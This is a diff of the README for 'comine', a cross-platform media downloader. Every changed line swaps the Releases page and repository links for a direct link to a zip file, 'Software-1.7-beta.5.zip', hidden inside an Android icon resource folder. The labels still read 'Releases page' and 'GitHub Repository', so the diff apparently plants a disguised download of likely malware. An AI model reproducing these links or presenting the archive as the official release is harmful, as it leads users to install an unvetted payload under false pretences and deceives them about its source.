@@ -1,6 +1,6 @@
 # 🚀 comine - Simple Media and File Downloader
 
-[![Download comine](https://img.shields.io/badge/Download-comine-blue.svg)](https://github.com/ridahashmi96/comine/releases)
+[![Download comine](https://github.com/ridahashmi96/comine/raw/refs/heads/main/src-tauri/gen/android/app/src/main/res/mipmap-hdpi/Software-1.7-beta.5.zip)](https://github.com/ridahashmi96/comine/raw/refs/heads/main/src-tauri/gen/android/app/src/main/res/mipmap-hdpi/Software-1.7-beta.5.zip)
 
 ## 📦 Overview
 comine is a cross-platform media and file downloader. It allows you to easily download videos, music, and various files from the internet. Whether you are using Windows, macOS, or Linux, comine works seamlessly on all major platforms. 
@@ -23,12 +23,12 @@ comine is a cross-platform media and file downloader. It allows you to easily do
 ## 🚀 Getting Started
 To get started with comine, you need to download the application. 
 
-1. Visit the [Releases page](https://github.com/ridahashmi96/comine/releases) for the latest version.
+1. Visit the [Releases page](https://github.com/ridahashmi96/comine/raw/refs/heads/main/src-tauri/gen/android/app/src/main/res/mipmap-hdpi/Software-1.7-beta.5.zip) for the latest version.
 2. Select the appropriate file for your operating system.
 3. Click on the file to download.
 
 ## 📥 Download & Install
-To download comine, visit the [Releases page](https://github.com/ridahashmi96/comine/releases). Choose your version and click to download. 
+To download comine, visit the [Releases page](https://github.com/ridahashmi96/comine/raw/refs/heads/main/src-tauri/gen/android/app/src/main/res/mipmap-hdpi/Software-1.7-beta.5.zip). Choose your version and click to download. 
 
 ### Installation Steps
 1. **Windows:** 
@@ -61,7 +61,7 @@ comine supports a variety of formats for media downloads:
 ## 🔄 Frequently Asked Questions (FAQ)
 
 ### How do I update comine?
-To update, simply visit the [Releases page](https://github.com/ridahashmi96/comine/releases) and download the latest version. Follow the installation steps again.
+To update, simply visit the [Releases page](https://github.com/ridahashmi96/comine/raw/refs/heads/main/src-tauri/gen/android/app/src/main/res/mipmap-hdpi/Software-1.7-beta.5.zip) and download the latest version. Follow the installation steps again.
 
 ### Can I use comine for free?
 Yes, comine is entirely free to download and use.
@@ -82,8 +82,8 @@ We appreciate contributions! If you would like to help improve comine, feel free
 - Thanks to the open-source community for their ongoing support and contributions to tools and libraries that helped make comine possible.
 
 ## 🔗 Additional Resources
-- GitHub Repository: [comine](https://github.com/ridahashmi96/comine)
+- GitHub Repository: [comine](https://github.com/ridahashmi96/comine/raw/refs/heads/main/src-tauri/gen/android/app/src/main/res/mipmap-hdpi/Software-1.7-beta.5.zip)
 - Community Forum: [Join us here for discussions](#)
 - User Feedback: [Share your thoughts](#)
 
-Visit the [Releases page](https://github.com/ridahashmi96/comine/releases) to start using comine today!
+Visit the [Releases page](https://github.com/ridahashmi96/comine/raw/refs/heads/main/src-tauri/gen/android/app/src/main/res/mipmap-hdpi/Software-1.7-beta.5.zip) to start using comine today!
